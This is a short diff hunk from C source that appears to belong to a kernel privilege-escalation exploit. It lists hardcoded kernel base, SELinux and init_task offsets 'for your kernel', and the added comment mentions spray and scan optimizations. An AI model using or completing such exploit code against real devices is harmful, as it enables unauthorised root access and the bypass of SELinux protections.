@@ -23,6 +23,7 @@
 #include <sys/resource.h>
 
 // ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
+// Updated with Batch Spray and Fast Scan optimizations
 #define KERNEL_BASE          0xffffffc03d000000ULL
 #define SELINUX_OFFSET       0x0000000002f74ce8ULL
 #define INIT_TASK_OFFSET     0x00000000024d90d0ULL
